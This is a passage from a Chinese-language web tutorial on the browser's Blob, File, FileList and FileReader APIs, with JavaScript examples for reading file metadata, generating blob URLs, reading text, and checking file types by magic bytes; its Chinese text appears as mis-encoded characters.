</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><code>slice</code>æ–¹æ³•æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œéƒ½æ˜¯å¯é€‰çš„ã€‚å®ƒä»¬ä¾æ¬¡æ˜¯èµ·å§‹çš„å­—èŠ‚ä½ç½®ï¼ˆé»˜è®¤ä¸º0ï¼‰ã€ç»“æŸçš„å­—èŠ‚ä½ç½®ï¼ˆé»˜è®¤ä¸º<code>size</code>å±æ€§çš„å€¼ï¼Œè¯¥ä½ç½®æœ¬èº«å°†ä¸åŒ…å«åœ¨æ‹·è´çš„æ•°æ®ä¹‹ä¸­ï¼‰ã€æ–°å®ä¾‹çš„æ•°æ®ç±»å‹ï¼ˆé»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸²ï¼‰ã€‚</p> <h3 id="è·å–æ–‡ä»¶ä¿¡æ¯"><a href="#è·å–æ–‡ä»¶ä¿¡æ¯" class="header-anchor">#</a> è·å–æ–‡ä»¶ä¿¡æ¯</h3> <p>æ–‡ä»¶é€‰æ‹©å™¨<code>&lt;input type=&quot;file&quot;&gt;</code>ç”¨æ¥è®©ç”¨æˆ·é€‰å–æ–‡ä»¶ã€‚å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œæµè§ˆå™¨ä¸å…è®¸è„šæœ¬è‡ªè¡Œè®¾ç½®è¿™ä¸ªæ§ä»¶çš„<code>value</code>å±æ€§ï¼Œå³æ–‡ä»¶å¿…é¡»æ˜¯ç”¨æˆ·æ‰‹åŠ¨é€‰å–çš„ï¼Œä¸èƒ½æ˜¯è„šæœ¬æŒ‡å®šçš„ã€‚ä¸€æ—¦ç”¨æˆ·é€‰å¥½äº†æ–‡ä»¶ï¼Œè„šæœ¬å°±å¯ä»¥è¯»å–è¿™ä¸ªæ–‡ä»¶ã€‚</p> <p>æ–‡ä»¶é€‰æ‹©å™¨è¿”å›ä¸€ä¸ª FileList å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ˜¯ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„æˆå‘˜ï¼Œæ¯ä¸ªæˆå‘˜éƒ½æ˜¯ä¸€ä¸ª File å®ä¾‹å¯¹è±¡ã€‚File å®ä¾‹å¯¹è±¡æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ Blob å®ä¾‹ï¼Œå¢åŠ äº†<code>name</code>å’Œ<code>lastModifiedDate</code>å±æ€§ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// HTML ä»£ç å¦‚ä¸‹</span>
<span class="token comment">// &lt;input type=&quot;file&quot; accept=&quot;image/*&quot; multiple onchange=&quot;fileinfo(this.files)&quot;/&gt;</span>

<span class="token keyword">function</span> <span class="token function">fileinfo</span><span class="token punctuation">(</span><span class="token parameter">files</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> files<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> f <span class="token operator">=</span> files<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>
      f<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token comment">// æ–‡ä»¶åï¼Œä¸å«è·¯å¾„</span>
      f<span class="token punctuation">.</span>size<span class="token punctuation">,</span> <span class="token comment">// æ–‡ä»¶å¤§å°ï¼ŒBlob å®ä¾‹å±æ€§</span>
      f<span class="token punctuation">.</span>type<span class="token punctuation">,</span> <span class="token comment">// æ–‡ä»¶ç±»å‹ï¼ŒBlob å®ä¾‹å±æ€§</span>
      f<span class="token punctuation">.</span>lastModifiedDate <span class="token comment">// æ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¶é—´</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>é™¤äº†æ–‡ä»¶é€‰æ‹©å™¨ï¼Œæ‹–æ”¾ API çš„<code>dataTransfer.files</code>è¿”å›çš„ä¹Ÿæ˜¯ä¸€ä¸ªFileList å¯¹è±¡ï¼Œå®ƒçš„æˆå‘˜å› æ­¤ä¹Ÿæ˜¯ File å®ä¾‹å¯¹è±¡ã€‚</p> <h3 id="ä¸‹è½½æ–‡ä»¶"><a href="#ä¸‹è½½æ–‡ä»¶" class="header-anchor">#</a> ä¸‹è½½æ–‡ä»¶</h3> <p>AJAX è¯·æ±‚æ—¶ï¼Œå¦‚æœæŒ‡å®š<code>responseType</code>å±æ€§ä¸º<code>blob</code>ï¼Œä¸‹è½½ä¸‹æ¥çš„å°±æ˜¯ä¸€ä¸ª Blob å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">getBlob</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span>responseType <span class="token operator">=</span> <span class="token string">'blob'</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">callback</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>xhr.response</code>æ‹¿åˆ°çš„å°±æ˜¯ä¸€ä¸ª Blob å¯¹è±¡ã€‚</p> <h3 id="ç”Ÿæˆ-url"><a href="#ç”Ÿæˆ-url" class="header-anchor">#</a> ç”Ÿæˆ URL</h3> <p>æµè§ˆå™¨å…è®¸ä½¿ç”¨<code>URL.createObjectURL()</code>æ–¹æ³•ï¼Œé’ˆå¯¹ Blob å¯¹è±¡ç”Ÿæˆä¸€ä¸ªä¸´æ—¶ URLï¼Œä»¥ä¾¿äºæŸäº› API ä½¿ç”¨ã€‚è¿™ä¸ª URL ä»¥<code>blob://</code>å¼€å¤´ï¼Œè¡¨æ˜å¯¹åº”ä¸€ä¸ª Blob å¯¹è±¡ï¼Œåè®®å¤´åé¢æ˜¯ä¸€ä¸ªè¯†åˆ«ç¬¦ï¼Œç”¨æ¥å”¯ä¸€å¯¹åº”å†…å­˜é‡Œé¢çš„ Blob å¯¹è±¡ã€‚è¿™ä¸€ç‚¹ä¸<code>data://URL</code>ï¼ˆURL åŒ…å«å®é™…æ•°æ®ï¼‰å’Œ<code>file://URL</code>ï¼ˆæœ¬åœ°æ–‡ä»¶ç³»ç»Ÿé‡Œé¢çš„æ–‡ä»¶ï¼‰éƒ½ä¸ä¸€æ ·ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> droptarget <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'droptarget'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

droptarget<span class="token punctuation">.</span><span class="token function-variable function">ondrop</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> files <span class="token operator">=</span> e<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span>files<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> files<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> type <span class="token operator">=</span> files<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>type<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'image/'</span><span class="token punctuation">)</span>
      <span class="token keyword">continue</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> img <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>files<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    img<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
      document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">revokeObjectURL</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>ä¸Šé¢ä»£ç é€šè¿‡ä¸ºæ‹–æ”¾çš„å›¾ç‰‡æ–‡ä»¶ç”Ÿæˆä¸€ä¸ª URLï¼Œäº§ç”Ÿå®ƒä»¬çš„ç¼©ç•¥å›¾ï¼Œä»è€Œä½¿å¾—ç”¨æˆ·å¯ä»¥é¢„è§ˆé€‰æ‹©çš„æ–‡ä»¶ã€‚</p> <p>æµè§ˆå™¨å¤„ç† Blob URL å°±è·Ÿæ™®é€šçš„ URL ä¸€æ ·ï¼Œå¦‚æœ Blob å¯¹è±¡ä¸å­˜åœ¨ï¼Œè¿”å›404çŠ¶æ€ç ï¼›å¦‚æœè·¨åŸŸè¯·æ±‚ï¼Œè¿”å›403çŠ¶æ€ç ã€‚Blob URL åªå¯¹ GET è¯·æ±‚æœ‰æ•ˆï¼Œå¦‚æœè¯·æ±‚æˆåŠŸï¼Œè¿”å›200çŠ¶æ€ç ã€‚ç”±äº Blob URL å°±æ˜¯æ™®é€š URLï¼Œå› æ­¤å¯ä»¥ä¸‹è½½ã€‚</p> <h3 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="header-anchor">#</a> è¯»å–æ–‡ä»¶</h3> <p>å–å¾— Blob å¯¹è±¡ä»¥åï¼Œå¯ä»¥é€šè¿‡<code>FileReader</code>å¯¹è±¡ï¼Œè¯»å– Blob å¯¹è±¡çš„å†…å®¹ï¼Œå³æ–‡ä»¶å†…å®¹ã€‚</p> <p>FileReader å¯¹è±¡æä¾›å››ä¸ªæ–¹æ³•ï¼Œå¤„ç† Blob å¯¹è±¡ã€‚Blob å¯¹è±¡ä½œä¸ºå‚æ•°ä¼ å…¥è¿™äº›æ–¹æ³•ï¼Œç„¶åä»¥æŒ‡å®šçš„æ ¼å¼è¿”å›ã€‚</p> <ul><li><code>FileReader.readAsText()</code>ï¼šè¿”å›æ–‡æœ¬ï¼Œéœ€è¦æŒ‡å®šæ–‡æœ¬ç¼–ç ï¼Œé»˜è®¤ä¸º UTF-8ã€‚</li> <li><code>FileReader.readAsArrayBuffer()</code>ï¼šè¿”å› ArrayBuffer å¯¹è±¡ã€‚</li> <li><code>FileReader.readAsDataURL()</code>ï¼šè¿”å› Data URLã€‚</li> <li><code>FileReader.readAsBinaryString()</code>ï¼šè¿”å›åŸå§‹çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚</li></ul> <p>ä¸‹é¢æ˜¯<code>FileReader.readAsText()</code>æ–¹æ³•çš„ä¾‹å­ï¼Œç”¨æ¥è¯»å–æ–‡æœ¬æ–‡ä»¶ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// HTML ä»£ç å¦‚ä¸‹</span>
<span class="token comment">// &lt;input type=â€™file' onchange='readfile(this.files[0])'&gt;&lt;/input&gt;</span>
<span class="token comment">// &lt;pre id='output'&gt;&lt;/pre&gt;</span>
<span class="token keyword">function</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  reader<span class="token punctuation">.</span><span class="token function">readAsText</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
  reader<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> text <span class="token operator">=</span> reader<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
    <span class="token keyword">var</span> out <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'output'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    out<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    out<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  reader<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Error'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œé€šè¿‡æŒ‡å®š FileReader å®ä¾‹å¯¹è±¡çš„<code>onload</code>ç›‘å¬å‡½æ•°ï¼Œåœ¨å®ä¾‹çš„<code>result</code>å±æ€§ä¸Šæ‹¿åˆ°æ–‡ä»¶å†…å®¹ã€‚</p> <p>ä¸‹é¢æ˜¯<code>FileReader.readAsArrayBuffer()</code>æ–¹æ³•çš„ä¾‹å­ï¼Œç”¨äºè¯»å–äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// HTML ä»£ç å¦‚ä¸‹</span>
<span class="token comment">// &lt;input type=&quot;file&quot; onchange=&quot;typefile(this.files[0])&quot;&gt;&lt;/input&gt;</span>
<span class="token keyword">function</span> <span class="token function">typefile</span><span class="token punctuation">(</span><span class="token parameter">file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// æ–‡ä»¶å¼€å¤´çš„å››ä¸ªå­—èŠ‚ï¼Œç”Ÿæˆä¸€ä¸ª Blob å¯¹è±¡</span>
  <span class="token keyword">var</span> slice <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// è¯»å–è¿™å››ä¸ªå­—èŠ‚</span>
  reader<span class="token punctuation">.</span><span class="token function">readAsArrayBuffer</span><span class="token punctuation">(</span>slice<span class="token punctuation">)</span><span class="token punctuation">;</span>
  reader<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> buffer <span class="token operator">=</span> reader<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
    <span class="token comment">// å°†è¿™å››ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Œè§†ä½œä¸€ä¸ª32ä½æ•´æ•°</span>
    <span class="token keyword">var</span> view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> magic <span class="token operator">=</span> view<span class="token punctuation">.</span><span class="token function">getUint32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// æ ¹æ®æ–‡ä»¶çš„å‰å››ä¸ªå­—èŠ‚ï¼Œåˆ¤æ–­å®ƒçš„ç±»å‹</span>
    <span class="token keyword">switch</span><span class="token punctuation">(</span>magic<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">case</span> <span class="token number">0x89504E47</span><span class="token operator">:</span> file<span class="token punctuation">.</span>verified_type <span class="token operator">=</span> <span class="token string">'image/png'</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x47494638</span><span class="token operator">:</span> file<span class="token punctuation">.</span>verified_type <span class="token operator">=</span> <span class="token string">'image/gif'</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x25504446</span><span class="token operator">:</span> file<span class="token punctuation">.</span>verified_type <span class="token operator">=</span> <span class="token string">'application/pdf'</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x504b0304</span><span class="token operator">:</span> file<span class="token punctuation">.</span>verified_type <span class="token operator">=</span> <span class="token string">'application/zip'</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>name<span class="token punctuation">,</span> file<span class="token punctuation">.</span>verified_type<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><h2 id="åä¸€ã€file-å¯¹è±¡ï¼Œfilelist-å¯¹è±¡ï¼Œfilereader-å¯¹è±¡"><a href="#åä¸€ã€file-å¯¹è±¡ï¼Œfilelist-å¯¹è±¡ï¼Œfilereader-å¯¹è±¡" class="header-anchor">#</a> åä¸€ã€File å¯¹è±¡ï¼ŒFileList å¯¹è±¡ï¼ŒFileReader å¯¹è±¡</h2> <h2 id="_1-file-å¯¹è±¡"><a href="#_1-file-å¯¹è±¡" class="header-anchor">#</a> 1.File å¯¹è±¡</h2> <p>File å¯¹è±¡ä»£è¡¨ä¸€ä¸ªæ–‡ä»¶ï¼Œç”¨æ¥è¯»å†™æ–‡ä»¶ä¿¡æ¯ã€‚å®ƒç»§æ‰¿äº† Blob å¯¹è±¡ï¼Œæˆ–è€…è¯´æ˜¯ä¸€ç§ç‰¹æ®Šçš„ Blob å¯¹è±¡ï¼Œæ‰€æœ‰å¯ä»¥ä½¿ç”¨ Blob å¯¹è±¡çš„åœºåˆéƒ½å¯ä»¥ä½¿ç”¨å®ƒã€‚</p> <p>æœ€å¸¸è§çš„ä½¿ç”¨åœºåˆæ˜¯è¡¨å•çš„æ–‡ä»¶ä¸Šä¼ æ§ä»¶ï¼ˆ<code>&lt;input type=&quot;file&quot;&gt;</code>ï¼‰ï¼Œç”¨æˆ·é€‰ä¸­æ–‡ä»¶ä»¥åï¼Œæµè§ˆå™¨å°±ä¼šç”Ÿæˆä¸€ä¸ªæ•°ç»„ï¼Œé‡Œé¢æ˜¯æ¯ä¸€ä¸ªç”¨æˆ·é€‰ä¸­çš„æ–‡ä»¶ï¼Œå®ƒä»¬éƒ½æ˜¯ File å®ä¾‹å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// HTML ä»£ç å¦‚ä¸‹</span>
<span class="token comment">// &lt;input id=&quot;fileItem&quot; type=&quot;file&quot;&gt;</span>
<span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'fileItem'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
file <span class="token keyword">instanceof</span> <span class="token class-name">File</span> <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>file</code>æ˜¯ç”¨æˆ·é€‰ä¸­çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒæ˜¯ File çš„å®ä¾‹ã€‚</p> <h3 id="æ„é€ å‡½æ•°-2"><a href="#æ„é€ å‡½æ•°-2" class="header-anchor">#</a> æ„é€ å‡½æ•°</h3> <p>æµè§ˆå™¨åŸç”Ÿæä¾›ä¸€ä¸ª<code>File()</code>æ„é€ å‡½æ•°ï¼Œç”¨æ¥ç”Ÿæˆ File å®ä¾‹å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> name <span class="token punctuation">[</span><span class="token punctuation">,</span> options<span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><code>File()</code>æ„é€ å‡½æ•°æ¥å—ä¸‰ä¸ªå‚æ•°ã€‚</p> <ul><li>arrayï¼šä¸€ä¸ªæ•°ç»„ï¼Œæˆå‘˜å¯ä»¥æ˜¯äºŒè¿›åˆ¶å¯¹è±¡æˆ–å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ–‡ä»¶çš„å†…å®¹ã€‚</li> <li>nameï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ–‡ä»¶åæˆ–æ–‡ä»¶è·¯å¾„ã€‚</li> <li>optionsï¼šé…ç½®å¯¹è±¡ï¼Œè®¾ç½®å®ä¾‹çš„å±æ€§ã€‚è¯¥å‚æ•°å¯é€‰ã€‚</li></ul> <p>ç¬¬ä¸‰ä¸ªå‚æ•°é…ç½®å¯¹è±¡ï¼Œå¯ä»¥è®¾ç½®ä¸¤ä¸ªå±æ€§ã€‚</p> <ul><li>typeï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„ MIME ç±»å‹ï¼Œé»˜è®¤å€¼ä¸ºç©ºå­—ç¬¦ä¸²ã€‚</li> <li>lastModifiedï¼šæ—¶é—´æˆ³ï¼Œè¡¨ç¤ºä¸Šæ¬¡ä¿®æ”¹çš„æ—¶é—´ï¼Œé»˜è®¤ä¸º<code>Date.now()</code>ã€‚</li></ul> <p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>
  <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token string">'foo.txt'</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>
    type<span class="token operator">:</span> <span class="token string">'text/plain'</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•-2"><a href="#å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•-2" class="header-anchor">#</a> å®ä¾‹å±æ€§å’Œå®ä¾‹æ–¹æ³•</h3> <p>File å¯¹è±¡æœ‰ä»¥ä¸‹å®ä¾‹å±æ€§ã€‚</p> <ul><li>File.lastModifiedï¼šæœ€åä¿®æ”¹æ—¶é—´</li> <li>File.nameï¼šæ–‡ä»¶åæˆ–æ–‡ä»¶è·¯å¾„</li> <li>File.sizeï¼šæ–‡ä»¶å¤§å°ï¼ˆå•ä½å­—èŠ‚ï¼‰</li> <li>File.typeï¼šæ–‡ä»¶çš„ MIME ç±»å‹</li></ul> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> myFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'file.bin'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
  lastModified<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token number">2018</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
myFile<span class="token punctuation">.</span>lastModified <span class="token comment">// 1517414400000</span>
myFile<span class="token punctuation">.</span>name <span class="token comment">// &quot;file.bin&quot;</span>
myFile<span class="token punctuation">.</span>size <span class="token comment">// 0</span>
myFile<span class="token punctuation">.</span>type <span class="token comment">// &quot;&quot;</span>
